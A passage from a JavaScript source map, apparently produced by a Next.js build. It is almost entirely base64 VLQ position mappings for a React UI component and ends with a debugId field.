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","debugId":null}}]
}